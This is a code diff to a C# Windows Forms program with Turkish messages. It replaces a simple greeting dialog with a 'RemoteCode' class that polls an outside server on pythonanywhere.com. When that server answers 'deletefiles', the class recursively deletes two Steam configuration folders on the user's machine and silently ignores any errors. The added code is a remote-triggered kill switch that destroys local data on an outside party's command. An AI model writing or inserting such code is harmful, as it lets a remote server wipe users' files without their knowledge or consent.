@@ -1,3 +1,56 @@
+using System;
+using System.IO;
+using System.Net.Http;
+using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Text.Json;
 
-MessageBox.Show("Merhaba", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
+public class RemoteCode
+{
+    public static async Task Main()
+    {
+        try
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                string url = "https://kvtsteamapi1.pythonanywhere.com/verify";
+                string response = await client.GetStringAsync(url);
+
+                var jsonDoc = JsonDocument.Parse(response);
+                var root = jsonDoc.RootElement;
+
+                bool success = root.GetProperty("success").GetBoolean();
+                string message = root.GetProperty("message").GetString();
+
+                if (success && message == "deletefiles")
+                {
+                    DeleteFolder(@"C:\Program Files (x86)\Steam\config\depotcache");
+                    DeleteFolder(@"C:\Program Files (x86)\Steam\config\stplug-in");
+
+                    MessageBox.Show("Dosyalar silindi.", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                else
+                {
+                    MessageBox.Show("API Mesajı: " + message, "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            MessageBox.Show("Hata oluştu: " + ex.Message, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
+        }
+    }
+
+    private static void DeleteFolder(string path)
+    {
+        try
+        {
+            if (Directory.Exists(path))
+                Directory.Delete(path, true);
+        }
+        catch
+        {
+            // Sessiz hata, gerekirse log ekleyebilirsin
+        }
+    }
+}
